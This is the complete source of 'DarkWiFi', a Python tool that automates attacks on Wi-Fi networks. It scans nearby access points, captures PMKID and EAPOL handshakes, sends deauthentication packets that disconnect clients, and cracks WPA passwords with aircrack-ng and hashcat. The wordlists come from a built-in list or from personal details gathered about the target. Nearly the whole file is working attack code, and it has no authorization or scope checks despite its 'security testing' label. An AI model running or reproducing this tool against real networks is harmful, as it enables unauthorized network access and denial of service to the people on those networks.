#!/usr/bin/env python3
"""
DarkWiFi - Advanced WiFi Security Testing Tool
Captures PMKID and EAPOL handshakes, converts to hashcat format, and cracks passwords
"""

import os
import sys
import argparse
import subprocess
import time
from datetime import datetime
from pathlib import Path

# Import wordlist generator
try:
    from wordlist_generator import WordlistGenerator
except ImportError:
    WordlistGenerator = None

# Color codes
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class Fore:
        RED = GREEN = YELLOW = BLUE = CYAN = MAGENTA = WHITE = RESET = ""
    class Style:
        BRIGHT = RESET_ALL = ""

class DarkWiFi:
    def __init__(self):
        self.interface = None
        self.monitor_interface = None
        self.captures_dir = Path("captures")
        self.wordlists_dir = Path("wordlists")
        self.cracked_dir = Path("cracked")

        # Create directories
        self.captures_dir.mkdir(exist_ok=True)
        self.wordlists_dir.mkdir(exist_ok=True)
        self.cracked_dir.mkdir(exist_ok=True)

    def print_banner(self):
        banner = f"""
{Fore.CYAN}╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║  {Fore.RED}██████╗  █████╗ ██████╗ ██╗  ██╗    ██╗    ██╗██╗███████╗██╗{Fore.CYAN}  ║
║  {Fore.RED}██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██║    ██║██║██╔════╝██║{Fore.CYAN}  ║
║  {Fore.RED}██║  ██║███████║██████╔╝█████╔╝     ██║ █╗ ██║██║█████╗  ██║{Fore.CYAN}  ║
║  {Fore.RED}██║  ██║██╔══██║██╔══██╗██╔═██╗     ██║███╗██║██║██╔══╝  ██║{Fore.CYAN}  ║
║  {Fore.RED}██████╔╝██║  ██║██║  ██║██║  ██╗    ╚███╔███╔╝██║██║     ██║{Fore.CYAN}  ║
║  {Fore.RED}╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝{Fore.CYAN}  ║
║                                                               ║
║         {Fore.YELLOW}Advanced WiFi Security Testing Tool{Fore.CYAN}                  ║
║              {Fore.GREEN}PMKID & EAPOL Capture + Hashcat{Fore.CYAN}                   ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(banner)

    def check_root(self):
        """Check if running as root"""
        if os.geteuid() != 0:
            print(f"{Fore.RED}[!] This tool requires root privileges. Please run with sudo.{Style.RESET_ALL}")
            sys.exit(1)

    def check_dependencies(self):
        """Check for required tools"""
        required_tools = {
            'airmon-ng': 'aircrack-ng',
            'airodump-ng': 'aircrack-ng',
            'aireplay-ng': 'aircrack-ng',
            'aircrack-ng': 'aircrack-ng',
            'hcxdumptool': 'hcxtools',
            'hcxpcapngtool': 'hcxtools',
            'hashcat': 'hashcat'
        }

        missing = []
        optional_missing = []

        for tool, package in required_tools.items():
            if subprocess.run(['which', tool], capture_output=True).returncode != 0:
                if tool in ['hashcat', 'hcxdumptool']:
                    optional_missing.append(f"{tool} ({package})")
                else:
                    missing.append(f"{tool} ({package})")

        if missing:
            print(f"{Fore.RED}[!] Missing required dependencies:{Style.RESET_ALL}")
            for item in missing:
                print(f"    - {item}")
            print(f"\n{Fore.CYAN}[*] Install with:{Style.RESET_ALL}")
            print(f"    apt-get install aircrack-ng hcxtools hashcat")
            return False

        if optional_missing:
            print(f"{Fore.YELLOW}[!] Missing optional tools:{Style.RESET_ALL}")
            for item in optional_missing:
                print(f"    - {item}")
            print(f"{Fore.CYAN}[*] Some features may be limited{Style.RESET_ALL}")

        print(f"{Fore.GREEN}[✓] Core dependencies satisfied{Style.RESET_ALL}")
        return True

    def list_interfaces(self):
        """List available wireless interfaces"""
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True, stderr=subprocess.STDOUT)
            interfaces = []
            for line in result.stdout.split('\n'):
                if 'IEEE 802.11' in line or 'ESSID' in line:
                    iface = line.split()[0]
                    interfaces.append(iface)
            return interfaces
        except:
            return []

    def enable_monitor_mode(self, interface):
        """Enable monitor mode on interface"""
        print(f"{Fore.CYAN}[*] Enabling monitor mode on {interface}...{Style.RESET_ALL}")

        # Kill interfering processes
        subprocess.run(['airmon-ng', 'check', 'kill'], capture_output=True)

        # Enable monitor mode
        result = subprocess.run(['airmon-ng', 'start', interface], capture_output=True, text=True)

        # Determine monitor interface name
        if 'mon' in result.stdout:
            self.monitor_interface = f"{interface}mon"
        else:
            self.monitor_interface = interface

        print(f"{Fore.GREEN}[✓] Monitor mode enabled: {self.monitor_interface}{Style.RESET_ALL}")
        return self.monitor_interface

    def disable_monitor_mode(self):
        """Disable monitor mode"""
        if self.monitor_interface:
            print(f"{Fore.CYAN}[*] Disabling monitor mode...{Style.RESET_ALL}")
            subprocess.run(['airmon-ng', 'stop', self.monitor_interface], capture_output=True)
            print(f"{Fore.GREEN}[✓] Monitor mode disabled{Style.RESET_ALL}")

    def scan_networks(self, interface, duration=30):
        """Scan for nearby networks"""
        print(f"{Fore.CYAN}[*] Scanning for networks for {duration} seconds...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop scanning{Style.RESET_ALL}\n")

        output_file = self.captures_dir / "scan-01.csv"

        # Remove old scan files
        for f in self.captures_dir.glob("scan-01*"):
            f.unlink()

        try:
            proc = subprocess.Popen([
                'airodump-ng',
                '--write', str(self.captures_dir / 'scan'),
                '--output-format', 'csv',
                interface
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            time.sleep(duration)
            proc.terminate()
            proc.wait()

        except KeyboardInterrupt:
            proc.terminate()
            proc.wait()

        return self.parse_scan_results()

    def parse_scan_results(self):
        """Parse airodump-ng CSV results and detect capabilities"""
        csv_file = self.captures_dir / "scan-01.csv"
        if not csv_file.exists():
            return []

        networks = []
        try:
            with open(csv_file, 'r', errors='ignore') as f:
                lines = f.readlines()

            in_aps = False
            for line in lines:
                if 'BSSID' in line and 'ESSID' in line:
                    in_aps = True
                    continue
                if 'Station MAC' in line:
                    break
                if in_aps and line.strip():
                    parts = line.split(',')
                    if len(parts) >= 14:
                        bssid = parts[0].strip()
                        channel = parts[3].strip()
                        encryption = parts[5].strip() if len(parts) > 5 else ''
                        power = parts[8].strip()
                        beacons = parts[9].strip() if len(parts) > 9 else '0'
                        essid = parts[13].strip()

                        if bssid and essid:
                            # Detect security type and capabilities
                            security = self.detect_security(encryption)
                            has_clients = int(beacons) > 10  # Likely has clients if many beacons

                            networks.append({
                                'bssid': bssid,
                                'channel': channel,
                                'power': power,
                                'essid': essid,
                                'encryption': encryption,
                                'security': security,
                                'has_clients': has_clients,
                                'beacons': beacons
                            })
        except:
            pass

        return networks

    def detect_security(self, encryption_string):
        """Detect security protocol from encryption string"""
        enc = encryption_string.upper()

        if 'WPA3' in enc:
            return 'WPA3'
        elif 'WPA2' in enc:
            return 'WPA2'
        elif 'WPA' in enc:
            return 'WPA'
        elif 'WEP' in enc:
            return 'WEP'
        elif 'OPN' in enc or not enc:
            return 'Open'
        else:
            return 'Unknown'

    def display_networks(self, networks):
        """Display discovered networks with security info"""
        if not networks:
            print(f"{Fore.RED}[!] No networks found{Style.RESET_ALL}")
            return

        print(f"\n{Fore.GREEN}[✓] Found {len(networks)} networks:{Style.RESET_ALL}\n")
        print(f"{Fore.CYAN}{'#':<4} {'ESSID':<25} {'BSSID':<20} {'CH':<4} {'PWR':<6} {'Security':<8} {'Clients':<8}{Style.RESET_ALL}")
        print("─" * 85)

        for i, net in enumerate(networks, 1):
            clients = "Yes" if net.get('has_clients', False) else "Maybe"
            security = net.get('security', 'Unknown')

            # Color code by security
            sec_color = Fore.RED if security in ['WPA2', 'WPA3'] else Fore.YELLOW if security == 'WPA' else Fore.GREEN

            print(f"{i:<4} {net['essid']:<25} {net['bssid']:<20} {net['channel']:<4} {net['power']:<6} {sec_color}{security:<8}{Style.RESET_ALL} {clients:<8}")

    def capture_pmkid(self, interface, bssid, channel, essid, timeout=300):
        """Capture PMKID using hcxdumptool"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        pcapng_file = self.captures_dir / f"pmkid_{essid}_{timestamp}.pcapng"

        print(f"\n{Fore.CYAN}[*] Capturing PMKID from {essid} ({bssid})...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Timeout: {timeout} seconds{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop early{Style.RESET_ALL}\n")

        try:
            proc = subprocess.Popen([
                'hcxdumptool',
                '-i', interface,
                '-o', str(pcapng_file),
                '--enable_status=1'
            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            start_time = time.time()
            while time.time() - start_time < timeout:
                if proc.poll() is not None:
                    break
                time.sleep(1)

            proc.terminate()
            proc.wait()

        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[*] Stopping capture...{Style.RESET_ALL}")
            proc.terminate()
            proc.wait()

        if pcapng_file.exists() and pcapng_file.stat().st_size > 0:
            print(f"{Fore.GREEN}[✓] Capture saved: {pcapng_file}{Style.RESET_ALL}")
            return pcapng_file
        else:
            print(f"{Fore.RED}[!] No data captured{Style.RESET_ALL}")
            return None

    def deauth_attack(self, interface, bssid, count=10):
        """Send deauth packets to force clients to reconnect"""
        print(f"{Fore.CYAN}[*] Sending {count} deauth packets to {bssid}...{Style.RESET_ALL}")

        try:
            subprocess.run([
                'aireplay-ng',
                '--deauth', str(count),
                '-a', bssid,
                interface
            ], capture_output=True, timeout=30)

            print(f"{Fore.GREEN}[✓] Deauth packets sent{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Deauth may have failed: {e}{Style.RESET_ALL}")

    def capture_handshake(self, interface, bssid, channel, essid, timeout=300, deauth=True):
        """Capture EAPOL handshake using airodump-ng with optional deauth"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_prefix = self.captures_dir / f"handshake_{essid}_{timestamp}"

        print(f"\n{Fore.CYAN}[*] Capturing handshake from {essid} ({bssid})...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Channel: {channel}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Timeout: {timeout} seconds{Style.RESET_ALL}")
        if deauth:
            print(f"{Fore.YELLOW}[*] Deauth attack: ENABLED{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Press Ctrl+C when handshake is captured{Style.RESET_ALL}\n")

        try:
            # Start airodump-ng
            proc = subprocess.Popen([
                'airodump-ng',
                '--bssid', bssid,
                '--channel', channel,
                '--write', str(output_prefix),
                interface
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # Wait a bit for airodump to start
            time.sleep(3)

            # Send deauth packets to force handshake
            if deauth:
                time.sleep(2)
                print(f"{Fore.CYAN}[*] Launching deauth attack to force handshake...{Style.RESET_ALL}")
                self.deauth_attack(interface, bssid, count=15)

                # Send another round after a delay
                time.sleep(10)
                self.deauth_attack(interface, bssid, count=10)

            # Continue capturing
            start_time = time.time()
            while time.time() - start_time < timeout:
                if proc.poll() is not None:
                    break

                # Check if handshake was captured
                cap_file = Path(str(output_prefix) + "-01.cap")
                if cap_file.exists():
                    # Quick check for EAPOL in capture
                    result = subprocess.run([
                        'aircrack-ng',
                        str(cap_file)
                    ], capture_output=True, text=True)

                    if 'handshake' in result.stdout.lower() or 'eapol' in result.stdout.lower():
                        print(f"\n{Fore.GREEN}[✓] Handshake captured!{Style.RESET_ALL}")
                        break

                time.sleep(5)

            proc.terminate()
            proc.wait()

        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[*] Stopping capture...{Style.RESET_ALL}")
            proc.terminate()
            proc.wait()

        # Find the capture file
        cap_file = Path(str(output_prefix) + "-01.cap")
        if cap_file.exists() and cap_file.stat().st_size > 0:
            print(f"{Fore.GREEN}[✓] Capture saved: {cap_file}{Style.RESET_ALL}")
            return cap_file
        else:
            print(f"{Fore.RED}[!] No handshake captured{Style.RESET_ALL}")
            return None

    def convert_to_hashcat(self, capture_file):
        """Convert capture to hashcat format using hcxpcapngtool"""
        print(f"\n{Fore.CYAN}[*] Converting to hashcat format...{Style.RESET_ALL}")

        hash_file = capture_file.with_suffix('.22000')

        result = subprocess.run([
            'hcxpcapngtool',
            '-o', str(hash_file),
            str(capture_file)
        ], capture_output=True, text=True)

        if hash_file.exists() and hash_file.stat().st_size > 0:
            print(f"{Fore.GREEN}[✓] Hashcat file created: {hash_file}{Style.RESET_ALL}")

            # Show hash info
            with open(hash_file, 'r') as f:
                hashes = f.readlines()
                print(f"{Fore.GREEN}[✓] Extracted {len(hashes)} hash(es){Style.RESET_ALL}")

            return hash_file
        else:
            print(f"{Fore.RED}[!] Conversion failed - no valid hashes found{Style.RESET_ALL}")
            return None

    def crack_with_aircrack(self, capture_file, wordlist=None):
        """Crack handshake using aircrack-ng"""
        if not capture_file or not capture_file.exists():
            print(f"{Fore.RED}[!] Capture file not found{Style.RESET_ALL}")
            return False

        # Use built-in wordlist if not specified
        if wordlist is None:
            wordlist = self.wordlists_dir / "common_passwords.txt"
            if not wordlist.exists():
                self.create_default_wordlist()

        print(f"\n{Fore.CYAN}[*] Starting aircrack-ng...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Capture file: {capture_file}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Wordlist: {wordlist}{Style.RESET_ALL}\n")

        try:
            result = subprocess.run([
                'aircrack-ng',
                '-w', str(wordlist),
                str(capture_file)
            ], capture_output=True, text=True)

            print(result.stdout)

            if 'KEY FOUND!' in result.stdout:
                print(f"\n{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
                print(f"{Fore.GREEN}[✓] PASSWORD CRACKED WITH AIRCRACK-NG!{Style.RESET_ALL}")
                print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")

                # Extract and save the password
                for line in result.stdout.split('\n'):
                    if 'KEY FOUND!' in line:
                        print(f"{Fore.GREEN}{line}{Style.RESET_ALL}")

                output_file = self.cracked_dir / f"cracked_{capture_file.stem}.txt"
                with open(output_file, 'w') as f:
                    f.write(result.stdout)
                print(f"\n{Fore.GREEN}[✓] Results saved to: {output_file}{Style.RESET_ALL}")
                return True
            else:
                print(f"{Fore.YELLOW}[*] No password found with aircrack-ng{Style.RESET_ALL}")
                return False

        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[*] Aircrack-ng interrupted{Style.RESET_ALL}")
            return False

    def crack_with_hashcat(self, hash_file, wordlist=None):
        """Crack hashes using hashcat"""
        if not hash_file or not hash_file.exists():
            print(f"{Fore.RED}[!] Hash file not found{Style.RESET_ALL}")
            return False

        # Check if hashcat is available
        if subprocess.run(['which', 'hashcat'], capture_output=True).returncode != 0:
            print(f"{Fore.YELLOW}[!] Hashcat not found, skipping{Style.RESET_ALL}")
            return False

        # Use built-in wordlist if not specified
        if wordlist is None:
            wordlist = self.wordlists_dir / "common_passwords.txt"
            if not wordlist.exists():
                self.create_default_wordlist()

        print(f"\n{Fore.CYAN}[*] Starting hashcat...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Hash file: {hash_file}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Wordlist: {wordlist}{Style.RESET_ALL}\n")

        # Hashcat mode 22000 for WPA-PMKID-PBKDF2 and WPA-EAPOL-PBKDF2
        output_file = self.cracked_dir / f"cracked_{hash_file.stem}.txt"

        cmd = [
            'hashcat',
            '-m', '22000',
            '-a', '0',
            str(hash_file),
            str(wordlist),
            '-o', str(output_file),
            '--force'
        ]

        try:
            result = subprocess.run(cmd, capture_output=True, text=True)

            # Check if anything was cracked
            if output_file.exists() and output_file.stat().st_size > 0:
                print(f"\n{Fore.GREEN}[✓] Results saved to: {output_file}{Style.RESET_ALL}")
                with open(output_file, 'r') as f:
                    results = f.read()
                    if results:
                        print(f"\n{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}[✓] PASSWORD CRACKED WITH HASHCAT!{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
                        print(results)
                        print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
                        return True
            else:
                print(f"{Fore.YELLOW}[*] No passwords cracked with hashcat{Style.RESET_ALL}")
                return False

        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[*] Hashcat interrupted{Style.RESET_ALL}")
            return False

    def crack_password(self, capture_file, wordlist=None, use_personal=False):
        """Crack password using both aircrack-ng and hashcat"""
        print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║              PASSWORD CRACKING MODULE                     ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚═══════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")

        # Generate personal wordlist if requested
        if use_personal and WordlistGenerator:
            print(f"{Fore.CYAN}[*] Generating personal wordlist...{Style.RESET_ALL}\n")
            generator = WordlistGenerator()
            personal_wordlist = generator.interactive_mode()

            if personal_wordlist:
                wordlist = personal_wordlist
        elif use_personal:
            print(f"{Fore.YELLOW}[!] WordlistGenerator not available{Style.RESET_ALL}")

        # Try aircrack-ng first (works with .cap files directly)
        print(f"{Fore.CYAN}[*] Attempting to crack with aircrack-ng...{Style.RESET_ALL}")
        if self.crack_with_aircrack(capture_file, wordlist):
            return True

        # Convert to hashcat format and try hashcat
        print(f"\n{Fore.CYAN}[*] Converting to hashcat format...{Style.RESET_ALL}")
        hash_file = self.convert_to_hashcat(capture_file)

        if hash_file:
            print(f"{Fore.CYAN}[*] Attempting to crack with hashcat...{Style.RESET_ALL}")
            if self.crack_with_hashcat(hash_file, wordlist):
                return True

        print(f"\n{Fore.RED}[!] Password not cracked with available methods{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Try using a larger wordlist or generate a personal wordlist{Style.RESET_ALL}")
        return False

    def intelligent_attack(self, interface, target_network, timeout=300, use_personal=False, wordlist=None):
        """Intelligently attack a network based on its capabilities"""
        bssid = target_network['bssid']
        channel = target_network['channel']
        essid = target_network['essid']
        security = target_network.get('security', 'Unknown')
        has_clients = target_network.get('has_clients', False)

        print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║           INTELLIGENT ATTACK MODE                         ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚═══════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")

        print(f"{Fore.YELLOW}[*] Target: {essid}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] BSSID: {bssid}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Channel: {channel}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Security: {security}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Has Clients: {'Yes' if has_clients else 'Maybe'}{Style.RESET_ALL}\n")

        # Generate personal wordlist if requested
        custom_wordlist = wordlist
        if use_personal and WordlistGenerator:
            print(f"{Fore.CYAN}[*] Let's gather some personal information about the target...{Style.RESET_ALL}")
            generator = WordlistGenerator()
            personal_wordlist = generator.interactive_mode()
            if personal_wordlist:
                custom_wordlist = personal_wordlist

        capture_file = None

        # Strategy 1: Try PMKID first (non-intrusive, works on many routers)
        print(f"\n{Fore.CYAN}[*] Strategy 1: Attempting PMKID capture (non-intrusive)...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] This attack is silent and doesn't disrupt the network{Style.RESET_ALL}")

        if subprocess.run(['which', 'hcxdumptool'], capture_output=True).returncode == 0:
            capture_file = self.capture_pmkid(interface, bssid, channel, essid, min(timeout, 120))

            if capture_file:
                print(f"\n{Fore.GREEN}[✓] PMKID captured successfully!{Style.RESET_ALL}")

                # Try to crack it
                if self.crack_password(capture_file, wordlist=custom_wordlist, use_personal=False):
                    return True
                else:
                    print(f"\n{Fore.YELLOW}[*] PMKID captured but not cracked yet{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[*] You can try cracking later with a better wordlist{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[!] hcxdumptool not available, skipping PMKID{Style.RESET_ALL}")

        # Strategy 2: Capture handshake with deauth
        print(f"\n{Fore.CYAN}[*] Strategy 2: Capturing handshake with deauth attack...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] This will temporarily disconnect clients to capture handshake{Style.RESET_ALL}")

        if has_clients or input(f"\n{Fore.CYAN}[?] No clients detected. Try anyway? (y/N): {Style.RESET_ALL}").lower() == 'y':
            capture_file = self.capture_handshake(
                interface,
                bssid,
                channel,
                essid,
                timeout,
                deauth=True
            )

            if capture_file:
                print(f"\n{Fore.GREEN}[✓] Handshake captured successfully!{Style.RESET_ALL}")

                # Try to crack it
                if self.crack_password(capture_file, wordlist=custom_wordlist, use_personal=False):
                    return True
                else:
                    print(f"\n{Fore.YELLOW}[*] Handshake captured but not cracked yet{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[*] You can try cracking later with a better wordlist{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] Failed to capture handshake{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[*] Skipping handshake capture{Style.RESET_ALL}")

        return False

    def create_default_wordlist(self):
        """Create a default wordlist with common passwords"""
        wordlist_file = self.wordlists_dir / "common_passwords.txt"

        common_passwords = [
            # Very common passwords
            "password", "12345678", "123456789", "1234567890",
            "qwerty", "abc123", "monkey", "1234567", "letmein",
            "trustno1", "dragon", "baseball", "iloveyou", "master",
            "sunshine", "ashley", "bailey", "passw0rd", "shadow",
            "123123", "654321", "superman", "qazwsx", "michael",

            # WiFi common
            "admin", "password1", "password123", "welcome", "root",
            "administrator", "changeme", "test", "guest", "user",

            # Patterns
            "00000000", "11111111", "12341234", "abcd1234",
            "password!", "Password1", "Welcome1", "Admin123",

            # Common WiFi passwords
            "wifi", "wireless", "internet", "router", "network",
            "wifipassword", "wifipass", "mypassword", "homepassword",
        ]

        # Add number sequences
        for i in range(10000000, 100000000, 1111111):
            common_passwords.append(str(i))

        # Add year-based passwords
        for year in range(1950, 2026):
            common_passwords.append(str(year))
            common_passwords.append(f"password{year}")
            common_passwords.append(f"wifi{year}")

        with open(wordlist_file, 'w') as f:
            for pwd in common_passwords:
                f.write(f"{pwd}\n")

        print(f"{Fore.GREEN}[✓] Created default wordlist: {wordlist_file}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[✓] Contains {len(common_passwords)} passwords{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(
        description='DarkWiFi - Advanced WiFi Security Testing Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 darkwifi.py --interface wlan0 --scan
  sudo python3 darkwifi.py -i wlan0 --pmkid --target "MyNetwork"
  sudo python3 darkwifi.py -i wlan0 --handshake --target "MyNetwork"
  sudo python3 darkwifi.py -i wlan0 --auto --crack

Modes:
  --scan          : Scan for networks
  --pmkid         : Capture PMKID
  --handshake     : Capture EAPOL handshake
  --auto          : Automatic mode (scan + capture + convert + crack)
        """
    )

    parser.add_argument('-i', '--interface', help='Wireless interface (e.g., wlan0)')
    parser.add_argument('--scan', action='store_true', help='Scan for networks')
    parser.add_argument('--pmkid', action='store_true', help='Capture PMKID')
    parser.add_argument('--handshake', action='store_true', help='Capture EAPOL handshake')
    parser.add_argument('--auto', action='store_true', help='Automatic mode (all-in-one)')
    parser.add_argument('--target', help='Target network ESSID')
    parser.add_argument('--bssid', help='Target BSSID')
    parser.add_argument('--channel', help='Target channel')
    parser.add_argument('--timeout', type=int, default=300, help='Capture timeout in seconds (default: 300)')
    parser.add_argument('--wordlist', help='Custom wordlist for cracking')
    parser.add_argument('--crack', action='store_true', help='Crack captured hashes')
    parser.add_argument('--personal', action='store_true', help='Generate personal wordlist from target info')
    parser.add_argument('--convert', help='Convert capture file to hashcat format')
    parser.add_argument('--no-deauth', action='store_true', help='Disable deauth attack during handshake capture')

    args = parser.parse_args()

    tool = DarkWiFi()
    tool.print_banner()
    tool.check_root()

    if not tool.check_dependencies():
        print(f"\n{Fore.RED}[!] Please install missing dependencies first{Style.RESET_ALL}")
        sys.exit(1)

    # Convert mode
    if args.convert:
        capture_file = Path(args.convert)
        if not capture_file.exists():
            print(f"{Fore.RED}[!] File not found: {capture_file}{Style.RESET_ALL}")
            sys.exit(1)

        hash_file = tool.convert_to_hashcat(capture_file)
        if hash_file and args.crack:
            tool.crack_with_hashcat(hash_file, args.wordlist)
        sys.exit(0)

    # Interface required for other modes
    if not args.interface:
        interfaces = tool.list_interfaces()
        if interfaces:
            print(f"{Fore.YELLOW}[!] Please specify an interface with -i/--interface{Style.RESET_ALL}")
            print(f"\n{Fore.CYAN}Available interfaces:{Style.RESET_ALL}")
            for iface in interfaces:
                print(f"  - {iface}")
        else:
            print(f"{Fore.RED}[!] No wireless interfaces found{Style.RESET_ALL}")
        sys.exit(1)

    try:
        # Enable monitor mode
        monitor_iface = tool.enable_monitor_mode(args.interface)

        # Auto mode - fully automated
        if args.auto:
            networks = tool.scan_networks(monitor_iface, duration=30)
            tool.display_networks(networks)

            if not networks:
                print(f"{Fore.RED}[!] No networks found to target{Style.RESET_ALL}")
                return

            # Ask user to select target
            try:
                choice = int(input(f"\n{Fore.CYAN}Select target network # (or 0 to exit): {Style.RESET_ALL}"))
                if choice == 0 or choice < 1 or choice > len(networks):
                    return
                target_net = networks[choice - 1]
            except (ValueError, KeyboardInterrupt):
                return

            # Run intelligent attack
            tool.intelligent_attack(
                monitor_iface,
                target_net,
                timeout=args.timeout,
                use_personal=args.personal,
                wordlist=args.wordlist
            )
            return

        # Scan mode
        if args.scan:
            networks = tool.scan_networks(monitor_iface, duration=30)
            tool.display_networks(networks)
            return

        # Manual capture modes
        if args.pmkid or args.handshake:
            if not args.bssid or not args.channel:
                print(f"{Fore.RED}[!] Need --bssid and --channel for capture{Style.RESET_ALL}")
                return

            capture_file = None

            if args.pmkid:
                capture_file = tool.capture_pmkid(
                    monitor_iface,
                    args.bssid,
                    args.channel,
                    args.target or "unknown",
                    args.timeout
                )

            if args.handshake and not capture_file:
                capture_file = tool.capture_handshake(
                    monitor_iface,
                    args.bssid,
                    args.channel,
                    args.target or "unknown",
                    args.timeout,
                    deauth=not args.no_deauth
                )

            # Crack the password
            if capture_file and args.crack:
                tool.crack_password(
                    capture_file,
                    wordlist=args.wordlist,
                    use_personal=args.personal
                )

    finally:
        # Cleanup
        tool.disable_monitor_mode()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
